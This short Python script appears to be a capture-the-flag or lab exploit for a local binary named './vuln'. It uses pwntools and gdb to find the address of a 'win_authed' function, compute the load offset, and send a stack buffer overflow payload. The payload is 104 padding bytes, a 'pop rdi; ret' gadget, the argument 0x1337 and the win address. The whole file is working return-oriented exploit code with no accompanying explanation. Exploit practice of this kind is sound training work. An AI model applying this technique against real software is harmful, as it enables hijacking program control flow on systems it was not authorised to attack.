#!/usr/bin/python3

# run with 'gdb -q -x exploit.py'
from pwn import *
import gdb as gdb

def callgdb(cmd):
	return gdb.execute(cmd, to_string=True, from_tty=True)

p = process("./vuln")

callgdb(f"attach {p.pid}")
#win_static = callgdb("print &win_authed")[0].split(" ")[-2]
#callgdb("run")
win = callgdb("print &win_authed").splitlines()[0].split(" ")[-2]
print(win)
#pop_rdi = callgdb('''ropper -- --search "pop rdi; ret;"''')
#callgdb("quit")

#callgdb("quit")
#print(f"gadget: {pop_rdi}")
offset = int(win,16) - 0x00001ed2
print(offset)
pop = 0x0000000000002013 + offset + 564
#callgdb(f"break win_authed")

trash = cyclic(104)
win = p64(int(win,16))
poprdi = p64(0x0000000000002013 + offset + 564)
token = p64(0x1337)

payload = trash + poprdi + token + win
p.sendline(b"200")
p.sendline(payload)
#p.interactive()
